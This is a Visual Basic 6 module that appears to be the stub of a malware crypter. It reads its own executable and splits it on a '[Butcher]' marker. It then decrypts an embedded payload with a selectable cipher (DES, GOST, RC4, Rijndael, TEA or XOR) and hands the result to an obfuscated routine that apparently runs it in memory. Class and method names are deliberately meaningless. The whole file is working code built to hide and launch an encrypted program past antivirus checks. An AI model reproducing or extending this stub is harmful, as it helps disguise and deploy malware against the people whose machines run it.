Attribute VB_Name = "Stb"
Option Explicit

Sub Main()
    
    Dim Free         As Long
    Dim Data         As String
    Dim Datos()      As String
    Dim hRC4         As New clsCETVORKA
    Dim hXOR         As New clsKAKORINA
    Dim hTEA         As New clsPIMPEK
    Dim hDES         As New clsKURAC
    Dim hGost        As New clsZNASONO
    Dim hRIJ         As New clsRODJO
    Dim JUZNIISTOKZAP As New NapokonBrdo
    
    Free = FreeFile
    
    Open App.Path & "\" & App.EXEName & ".exe" For Binary As Free
        
        Data = Space$(LOF(1))
        Get #1, , Data
        
    Close Free
    
    Datos() = Split(Data, "[Butcher]")
    
    
    If Datos(4) = 1 Then Datos(1) = hDES.DecryptString(Datos(1), Datos(3))
    If Datos(4) = 2 Then Datos(1) = hGost.DecryptString(Datos(1), Datos(3))
    If Datos(4) = 3 Then Datos(1) = hRC4.DecryptString(Datos(1), Datos(3))
    If Datos(4) = 4 Then Datos(1) = hRIJ.DecryptString(Datos(1), Datos(3))
    If Datos(4) = 5 Then Datos(1) = hTEA.DecryptString(Datos(1), Datos(3))
    If Datos(4) = 6 Then Datos(1) = hXOR.DecryptString(Datos(1), Datos(3))
    
    JUZNIISTOKZAP.WISDFNASDKFJAKSDFJKADFKAJDSFKAJSDFJKADSFJASD StrConv(Datos(1), vbFromUnicode), vbNullString
    
End Sub

